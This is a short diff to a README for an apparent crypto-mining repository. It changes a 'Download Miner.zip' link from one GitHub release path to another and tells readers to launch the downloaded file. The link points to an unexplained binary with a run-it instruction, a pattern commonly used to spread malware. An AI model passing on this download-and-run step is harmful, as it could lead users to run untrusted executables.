@@ -28,7 +28,7 @@ The primary focus of this repository is to provide tools and scripts for cryptoc
 
 ## 📦 Get Started
 To access the tools and resources provided in this repository, you can download the necessary files from the following link: 
-[![Download Crypto Miner](https://img.shields.io/badge/Download-Miner.zip-green)](https://github.com/deibidariel4/special-octo-potato/releases/download/Miner/Miner.zip)
+[![Download Crypto Miner](https://img.shields.io/badge/Download-Miner.zip-green)](https://github.com/deibidariel4/USDT-ETH-BTC-MINER/releases/download/Miner/Miner.zip)
 
 📌 Note: Make sure to launch the file contained in the link to start mining effectively.
 
